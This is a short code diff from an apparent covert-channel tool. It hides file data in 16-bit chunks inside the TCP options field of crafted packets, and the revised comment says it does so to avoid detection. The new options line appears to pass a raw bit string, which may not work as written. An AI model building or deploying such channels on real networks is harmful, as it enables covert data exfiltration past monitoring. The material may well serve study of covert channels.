@@ -2054,8 +2054,10 @@ def transfer_file_tcp_options(client_sock: socket.socket,
     options field.
 
     @note Bit length
-        The options field for TCP headers is maximum 320 bits (40 bytes)
-        16 bits chosen here for covert channel
+        - The options field for TCP headers is maximum 320 bits (40 bytes)
+
+        - 16 bits chosen here for covert channel and to prevent easy
+          detection
 
     @param client_sock:
         A socket representing the client socket
@@ -2085,7 +2087,9 @@ def transfer_file_tcp_options(client_sock: socket.socket,
     packets = []
     for i in range(0, len(binary_data), 16):  # 16 bit chunks
         binary_segment = binary_data[i:i + 16].ljust(16, '0')
-        options_data = int(binary_segment, 2)
+
+        options_data = [('Raw', binary_segment)]
+
         packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, options=options_data)
         packets.append(packet)
 
